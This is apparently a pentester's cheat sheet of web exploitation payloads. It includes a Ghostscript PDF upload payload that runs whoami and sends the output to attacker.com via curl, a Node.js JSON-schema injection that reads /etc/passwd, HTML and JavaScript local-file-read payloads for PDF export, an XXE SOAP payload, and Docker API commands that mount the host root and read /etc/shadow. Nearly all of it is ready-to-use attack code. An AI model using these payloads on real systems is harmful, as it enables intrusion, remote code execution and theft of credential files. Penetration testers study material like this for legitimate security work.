# Web Exploitation Methods

## Enumeration

### HTTP PROBE using cURL

```
cat alive-subdomains.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
```

### PHP Disabled Function Check

```
<?php var_dump(explode(',',ini_get('disable_functions'))); ?>
```

## Exploitation

### PDF RCE

[https://www.openwall.com/lists/oss-security/2018/08/21/2](https://www.openwall.com/lists/oss-security/2018/08/21/2)

```
Content-Disposition: form-data; name="fileToUpload"; filename="pwn.pdf"
Content-Type: application/pdf

%!PS
currentdevice null true mark /OutputICCProfile (%pipe%curl http://attacker.com/?a=$(whoami|base64) )
.putdeviceparams
quit
```

### Node.JS JSON Validation Command Injection (RCE)

```
// https://hackerone.com/reports/894308
const schema = {
  type: 'object',
  properties: {
    'x[console.log(process.mainModule.require(`child_process`).execSync(`cat /etc/passwd`).toString(`utf-8`))]': {
      required: true,
      type:'string'
    }
  },
}
```

### PDF Export Injection / HTML Injection / Server Side Request Forgery (SSRF) Local File Read

#### Using HTML

##### iframe

```
<iframe src="file:///C:/windows/system32/drivers/etc/hosts height=1000 width=1000/>
```

Via [securityonline.info](https://securityonline.info/export-injection-new-server-side-vulnerability/)

##### object

```
<object data=”http://127.0.0.1:8443”/>
```

##### link

```
# local file read
<link rel=attachment src="file:///etc/passwd">
# to extract
pdfdetach -saveall vuln.doc
```

#### Using Javascript

```
<script>x=new XMLHttpRequest; 
x.onload=function(){ document.write(this.responseText) }; 
x.open("GET","file:///etc/passwd"); x.send(); </script> 
```

Via [noob.ninja](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html) 

#### object

```
<html>
  <body>
    <object data="file:///etc/passwd"/>
  </body>
</html>
```

#### portal

```
<html>
  <body>
    <portal src="file:///etc/passwd" id=portal></portal>
  </body>
</html>
```

### XXE

- [XXE inside a SOAP node](https://twitter.com/agarri_fr/status/656440244116574208?lang=en):

```
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://0x0:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

### Misc

Docker API (2375/tcp) Easy RCE by PTSwarm

```
# exploit
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine

# file access
cat /mnt/etc/shadow

# RCE
chroot /mnt
```